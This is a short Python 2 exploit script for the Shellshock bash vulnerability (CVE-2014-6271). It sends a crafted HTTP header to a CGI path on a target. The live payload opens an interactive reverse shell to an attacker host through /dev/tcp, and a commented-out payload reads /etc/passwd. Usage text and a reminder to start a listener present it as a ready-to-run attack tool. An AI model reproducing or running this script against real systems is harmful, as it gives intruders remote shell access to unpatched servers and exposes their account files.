#
#CVE-2014-6271 cgi-bin reverse shell
#

import httplib,urllib,sys

if (len(sys.argv)<4):
	print "Usage: %s <host> <vulnerable CGI> <attackhost/IP>" % sys.argv[0]
	print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
	exit(0)

conn = httplib.HTTPConnection(sys.argv[1])

# Dump the passwd file
#payload='() { test;};echo "Content-type: text/plain"; echo; echo; /bin/cat /etc/passwd'

# bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
# Don't forget to start a listener ;)
payload="() { ignored;}; /bin/bash -i >& /dev/tcp/%s 0>&1" % sys.argv[3]

headers = {"Content-type": "application/x-www-form-urlencoded",
	"test":payload }

conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data
